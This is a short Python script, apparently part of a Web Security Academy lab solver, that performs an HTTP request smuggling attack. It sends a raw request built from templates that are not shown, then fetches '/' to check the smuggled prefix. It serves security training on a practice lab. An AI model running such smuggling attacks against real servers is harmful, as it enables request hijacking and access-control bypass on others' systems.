from web_security_academy.core.utils import render_template_file
from web_security_academy.core.logger import logger


def solve_lab(session):
    smuggled = render_template_file("smuggled.txt")
    req = render_template_file(
        "http.txt",
        hostname=session.hostname,
        smuggled=smuggled,
    ).replace("\n", "\r\n")

    session.send_raw(req.encode())
    logger.info("Prepended the following to the next request:")
    print(smuggled)

    resp = session.get_path("/")
    logger.info("Received the following response after sending HTTP request:")
    logger.info(resp.text)
